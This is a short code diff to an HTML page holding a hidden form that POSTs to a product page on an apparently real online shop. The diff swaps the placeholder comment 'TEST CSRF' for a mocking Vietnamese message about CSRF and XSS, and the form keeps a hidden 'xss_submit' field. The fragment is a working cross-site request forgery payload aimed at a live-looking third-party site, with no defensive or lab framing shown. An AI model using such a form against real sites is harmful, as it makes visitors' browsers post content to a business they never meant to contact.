@@ -2958,7 +2958,11 @@
       method="POST"
       action="https://mydecobox.shop/product/hop-qua-canh-cong/"
     >
-      <input type="hidden" name="comment" value="TEST CSRF" />
+      <input
+        type="hidden"
+        name="comment"
+        value="Sản phẩm này bị dính CSRF và nhân viên giao hàng quá lâu, khiến tôi phải nổi cơn XSS"
+      />
       <input type="hidden" name="xss_submit" value="1" />
     </form>
 
